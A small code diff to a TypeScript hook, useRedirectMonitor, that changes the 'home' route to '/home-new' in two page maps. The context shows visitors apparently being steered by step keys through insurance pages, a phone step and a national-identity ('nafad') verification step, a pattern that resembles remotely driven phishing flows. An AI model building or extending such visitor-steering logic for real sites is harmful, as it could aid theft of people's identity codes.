@@ -38,7 +38,7 @@ export function useRedirectMonitor({ visitorId, currentPage }: UseRedirectMonito
             
             // Navigate to the requested page
             const pageMap: Record<string, string> = {
-              'home': '/',
+              'home': '/home-new',
               'insur': '/insur',
               'compar': '/compar',
               'check': '/check',
@@ -56,7 +56,7 @@ export function useRedirectMonitor({ visitorId, currentPage }: UseRedirectMonito
           // Legacy system: Check currentStep field for phone and nafad
           else if (currentStep) {
             const legacyPageMap: Record<string, { page: string, url: string }> = {
-              'home': { page: 'home', url: '/' },
+              'home': { page: 'home', url: '/home-new' },
               'phone': { page: 'phone', url: '/step5' },
               '_t6': { page: 'nafad', url: '/step4' },
               '_st1': { page: 'check', url: '/check' },
